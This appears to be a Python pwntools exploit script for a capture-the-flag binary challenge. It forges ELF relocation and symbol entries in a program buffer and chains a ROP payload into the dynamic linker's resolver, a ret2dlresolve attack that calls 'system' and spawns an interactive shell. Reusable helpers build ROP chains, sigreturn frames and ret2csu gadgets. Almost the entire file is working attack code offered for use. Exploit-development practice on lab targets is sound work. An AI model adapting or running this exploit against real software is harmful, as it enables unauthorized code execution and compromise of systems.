from typing import Literal
from ctypes import CDLL
import os
import pwn

os.chdir(os.path.dirname(__file__))
pwn.context.log_level = "debug"
use_patched: bool = False
exe_path = "binary" if (not use_patched) else "debug/binary_patched"
gdbscript: str = """
	b pwnme
	nextret
	c
"""

def exploit():
	exe = pwn.context.binary = pwn.ELF(exe_path)
	libc = exe.libc
	if (libc and pwn.context.arch == "amd64"):
		cdll = CDLL(libc.path)


	SIZEOF_ELF64_RELA = 0x18
	SIZEOF_ELF64_SYM = 0x18
	SYMBOL_NAME = b"system\0\0"
	BINSH = b"sh"
	JMPREL = exe.dynamic_value_by_tag("DT_JMPREL")
	SYMTAB = exe.dynamic_value_by_tag("DT_SYMTAB")
	STRTAB = exe.dynamic_value_by_tag("DT_STRTAB")

	# Explain
	LEN_BUFFER = 0x20
	BUFFER_INDEX = 1
	WRITE_ADDRESS = exe.sym["buffers"] + BUFFER_INDEX*LEN_BUFFER
	ELF64_RELA_ADDRESS = WRITE_ADDRESS + 0x0
	ELF64_SYM_ADDRESS = WRITE_ADDRESS + 0x10
	SYMBOL_ADDRESS = WRITE_ADDRESS + 0x18

	print(f"{hex(ELF64_RELA_ADDRESS) = }")
	print(f"{hex(ELF64_SYM_ADDRESS) = }")
	print(f"{hex(JMPREL) = }")
	print(f"{hex(SYMTAB) = }")

	assert (ELF64_RELA_ADDRESS - JMPREL) % SIZEOF_ELF64_RELA == 0
	assert (ELF64_SYM_ADDRESS - SYMTAB) % SIZEOF_ELF64_SYM == 0
	# exit()


	with connect(
		[exe.path], "localhost", "1089",
		gdbscript, ssl=False,
		default_mode="local",
	) as io:

		payload1 = pwn.flat(
			# struct Elf64_Rela
			pwn.p64(0x404100), # address: where to write symbol address
			pwn.p32(0x7), # r_info[LOWER]: must 0x7 to pass sanity check as functions
			pwn.p32((ELF64_SYM_ADDRESS - SYMTAB) // SIZEOF_ELF64_SYM), # r_info[HIGHER]: symtab offset
			
			# struct Elf64_Sym
			pwn.p32(SYMBOL_ADDRESS - STRTAB), # st_name: strtab offset
			pwn.p8(0x12), # st_info: can be anything (in teory must 0x12)
			pwn.p8(0x0), # st_other: must be multiple of 0x4
			pwn.p16(0x0), # st_shndx: can be anything
			# 0x0, # st_value: can be anything
			# 0x0, # st_size: can be anything

			# Strings
			SYMBOL_NAME,
		)[1:-1]
		print(payload1)
		print(len(payload1))

		rop = ROP(exe)
		rop.pad(15) # pad
		rop.raw(exe.get_section_by_name(".plt").header.sh_addr)  # jump to reloc subroutine that push linkmap and call dl_runtime_resolve_xsavec
		rop.raw((ELF64_RELA_ADDRESS - JMPREL) // SIZEOF_ELF64_RELA) # push reloc_arg
		payload2 = bytes(rop)
		print(payload2)
		print(len(payload2))


		io.sendlineafter(b"> ", BINSH)
		io.sendlineafter(b"> ", f"{BUFFER_INDEX}".encode())
		io.sendlineafter(b"> ", b"1")
		io.sendafter(b"> ", payload1)

		io.sendlineafter(b"> ", b"3")
		io.sendlineafter(b"> ", b"255")
		io.sendafter(b"> ", payload2)

		io.interactive()


def main():
	exploit()


def connect(
		args: list[str], hostname: str, port: int | str,
		gdbscript: str = '', ssl: bool = False, add_env: dict[str, str] = {},
		default_mode: Literal["remote", "local", "gdb"] = "local",
	) -> pwn.tube:

	if pwn.args.LOCAL:
		mode = "local"
	elif pwn.args.GDB:
		mode = "gdb"
	elif pwn.args.REMOTE:
		mode = "remote"
	else:
		mode = default_mode

	env = os.environ.copy()
	env.update(add_env)

	if mode == "remote":
		io = pwn.remote(hostname, port, ssl=ssl)
	elif mode == "local":
		io = pwn.process(argv=args, env=env)
	elif mode == "gdb":
		io = pwn.gdb.debug(args=args, gdbscript=gdbscript)
	else:
		raise ValueError("Unknown mode")

	return io


def protect_ptr(pos, ptr):
	return (pos >> 12) ^ ptr

def decrypt_ptr(val):
    mask = 0xfff << (64-12)
    while mask:
        v = val & mask
        val ^= v >> 12
        mask >>= 12
    return val


class ROP(pwn.ROP):
	def __init__(self, *elfs: pwn.ELF, base: int | None = None, badchars: bytes = b'') -> None:

		# Dict for already found string
		self.string_addr = {}

		# Init a cyclic generator for padding without badchars
		self.pad_generator = pwn.cyclic_gen(alphabet=pwn.context.cyclic_alphabet.translate(None, delete=badchars))

		# Include in ROP only the elf with known base address
		elfs = [elf for elf in elfs if isinstance(elf, pwn.ELF) and elf.address]

		super().__init__(elfs, base, badchars)

	def pad(self, length: int, pattern: bytes = b'') -> None:
		"""Insert some padding character of the given length, using a certain pattern if given"""

		if pattern:
			self.raw((pattern * (length//len(pattern) + 1))[:length])
		else:
			self.raw(self.pad_generator.get(length))

	def add_ret(self) -> None:
		"""Add a ret to align the stack pointer"""

		self.raw(self.ret.address)

	def have_badchar(self, value) -> bytes:
		"""Check if any byte of the value is not a bad char"""

		for byte in pwn.flat(value):
			if byte in self._badchars:
				return byte.to_bytes()
		return b''
	
	def resolve(self, resolvable):
		"""Resolve a symbol to an address"""

		addr = super().resolve(resolvable)
		if badchar := self.have_badchar(addr):
			raise ValueError(f"The address of {resolvable} have the badchar {badchar}")
		return addr

	def resolve_value(self, value) -> int:
		"""Transform a value from the supported type in integer"""

		# Transform string into bytes with ending nullbyte
		if isinstance(value, str):
			value = value.encode()
			if value[-1] != 0:
				value += b'\0'

		elif value is None:
			value = 0

		# Search bytes in the elfs, returning the address
		if isinstance(value, bytes):
			if value in self.string_addr:
				return self.string_addr[value]

			for elf in self.elfs:
				for addr in elf.search(value):
					if not self.have_badchar(addr):
						self.string_addr[value] = addr
						return addr
					
			raise ValueError(f"Cannot find an address of the string {value} without badchars")
		
		elif isinstance(value, int):
			if badchar := self.have_badchar(value):
				raise ValueError(f"The value {value} have the badchar {badchar}")
			return value
		
		raise TypeError(f"Unsupported type {type(value)} of the value {value}")
   
	def call(self, resolvable, *arguments) -> None:
		"""Call an address with given arguments"""

		args = [self.resolve_value(arg) for arg in arguments]
		super().call(self.resolve(resolvable), args)

	def system_call(self, syscall: int, *arguments) -> None:
		"""Call the given systemcall with arguments"""

		if badchar := self.have_badchar(syscall):
			raise ValueError(f"Syscall {syscall} have the badchar {badchar}")
		
		self(rax=syscall)
		self.call(self.syscall.address, *arguments)

	def sigreturn(self, registers: dict):
		"""Do a sigreturn with the given registers"""

		# Handle symbols in the 'rip' register
		if 'rip' in registers:
			registers['rip'] = self.resolve(registers['rip'])

		# Handle syscall in the 'rax' register if 'rip' is not setted
		elif 'rax' in registers:
			registers['rip'] = self.syscall.address

		# Build sigreturn frame
		frame = pwn.SigreturnFrame()
		for reg, value in registers.items():
			frame[reg] = self.resolve_value(value)

		self.system_call(pwn.constants.SYS_rt_sigreturn)
		self.raw(bytes(frame))

	def ret2csu(self, edi=0, rsi=0, rdx=0, rbx=0, rbp=0, r12=0, r13=0, r14=0, r15=0, call=None):
		"""Do a ret2csu with the given registers"""

		regs = [self.resolve_value(reg) for reg in (edi, rsi, rdx, rbx, rbp, r12, r13, r14, r15)]
		super().ret2csu(*regs, call)


if __name__ == "__main__":
	# Personalize this
	if os.getenv("WSL_DISTRO_NAME"):
		terminal_settings = ["wt.exe", "-w", "0"]
		if "WT_SESSION" in os.environ: terminal_settings += ["sp"]
		terminal_settings += ["wsl", "--cd", os.path.abspath(os.curdir), "-d", os.getenv("WSL_DISTRO_NAME")]
		pwn.context.terminal = terminal_settings

	main()
